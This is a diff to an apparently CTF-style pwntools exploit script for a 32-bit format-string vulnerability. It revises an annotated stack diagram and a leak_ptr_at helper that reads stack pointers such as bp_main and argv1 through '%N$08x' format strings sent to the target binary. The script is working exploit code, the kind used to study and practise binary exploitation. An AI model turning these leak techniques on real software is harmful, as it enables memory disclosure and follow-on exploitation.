@@ -15,16 +15,16 @@ log.info('target_addr: %08x', target_addr)
   4   | bp_vuln
       +================ (printf)
   4   | vuln+X (call)
-      +---------------- <-- sp_vuln ("$0")
-      | fmt ptr         // can't be leaked (too close: "$0" not valid)
- 0x18 |----------------
-      |     ...
-      +---------------- <-- bp_vuln
+      +---------------- <-- sp_vuln    ($0, content not leakable as "$0" is not valid)
+      | fmt ptr
+ 0x18 |----------------                 $1
+      |     ...                         ..
+      +---------------- <-- bp_vuln     $6
   4   | bp_main
-      +================ (vuln)
+      +================ (vuln)          $7
   4   | main+X (call)
-      +---------------- <-- sp_main
-      | fmt ptr         // leakable!  o----.
+      +---------------- <-- sp_main     $8 (content leakable!)
+      | fmt ptr                       o----.
  0x10 |----------------                    |
       |     ...                            |
       +----------------                    |
@@ -51,16 +51,14 @@ def get_fixed_len_fmt(fmt):
 
 
 # off is relative to sp_vuln
-def leak_ptr_at(off):
-    idx = off >> 2
-    assert idx * 4 == off
+def leak_ptr_at(idx):
     fmt = get_fixed_len_fmt('%' + str(idx) + '$08x')
     with s.system([args.BIN, fmt]) as p:
         return int(p.recv()[:8], 16)
 
 
 # Leak the first accessible hint about the stack address
-bp_main = leak_ptr_at(0x18)
+bp_main = leak_ptr_at(6)
 log.info('bp_main: %08x', bp_main)
 
 # Stack pointer reference to use to derivate format printf argument indices
@@ -68,9 +66,7 @@ sp_vuln = (bp_main & ~0xf) - 0x10 - 4 - 4 - 0x18
 log.info('sp_vuln: %08x', sp_vuln)
 
 # Identify fmt address pushed by vuln's parent
-sp_main = sp_vuln + 0x18 + 4 + 4
-sp_main_off = sp_main - sp_vuln
-argv1 = leak_ptr_at(sp_main_off)
+argv1 = leak_ptr_at(8)
 argv1_off = argv1 - sp_vuln
 log.info('argv1: %08x (+%d)', argv1, argv1_off)
 
